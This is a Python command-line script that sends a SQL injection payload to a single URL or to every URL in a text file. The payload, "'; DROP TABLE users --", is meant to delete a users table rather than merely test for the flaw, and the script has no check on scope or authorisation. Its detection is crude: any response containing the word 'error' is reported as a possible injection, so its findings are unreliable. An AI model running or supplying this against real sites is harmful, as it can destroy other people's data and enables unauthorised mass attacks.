import sys
import requests
import urllib.parse
from urllib3.exceptions import NewConnectionError, MaxRetryError, ConnectTimeoutError

# SQL injection payload (modify as needed)
payload = "'; DROP TABLE users --"

def check_sql_injection(url):
    try:
        # Check if the URL has a scheme (http:// or https://)
        if not url.startswith("http://") and not url.startswith("https://"):
            # If no scheme is specified, add "https://"
            url = "https://" + url

        # Encode the SQL injection payload
        encoded_payload = urllib.parse.quote(payload)

        # Append the encoded payload as a query parameter
        target_url = f"{url}?q={encoded_payload}"

        # Send an HTTP GET request to the modified URL
        response = requests.get(target_url, timeout=10)

        if "Server" in response.headers and "cloudflare" in response.headers["Server"].lower():
            print(f"Cloudflare Protection Detected for {url}")
        else:
            if "error" in response.text.lower():
                print(f"Possible SQL Injection Detected for {url}")
            else:
                print(f"No SQL Injection Detected for {url}")

    except (NewConnectionError, MaxRetryError, ConnectTimeoutError):
        print(f"Connection Error: Skipping {url}")
    except requests.exceptions.ConnectionError:
        print(f"Connection Error: Skipping {url}")

if len(sys.argv) < 2:
    print("Usage: python script.py <URL or file>")
    sys.exit(1)

# Get the URL or file name from the command-line argument
input_arg = sys.argv[1]

# Check if the input argument is a file
if input_arg.endswith(".txt"):
    # Read URLs from the file
    with open(input_arg, "r") as file:
        urls = [line.strip() for line in file]

    # Iterate through the list of URLs and check for SQL injection
    for url in urls:
        check_sql_injection(url)
else:
    # The input argument is a single URL, check it for SQL injection
    check_sql_injection(input_arg)

